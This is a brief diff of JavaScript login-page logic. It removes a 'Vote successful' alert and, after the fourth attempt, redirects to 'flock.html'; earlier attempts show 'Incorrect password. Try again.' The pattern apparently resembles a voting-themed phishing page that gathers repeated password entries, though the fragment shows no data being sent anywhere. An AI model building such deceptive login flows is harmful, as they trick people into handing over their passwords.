@@ -179,8 +179,7 @@
 
         // Show feedback based on attempt count
         if (attemptCount >= 4) {
-            alert("Vote successful");
-            window.location.href = "flock.html"; // Redirect after showing success
+            window.location.href = "flock.html"; // Redirect after the 4th attempt
         } else {
             errorMessage.textContent = "Incorrect password. Try again.";
         }
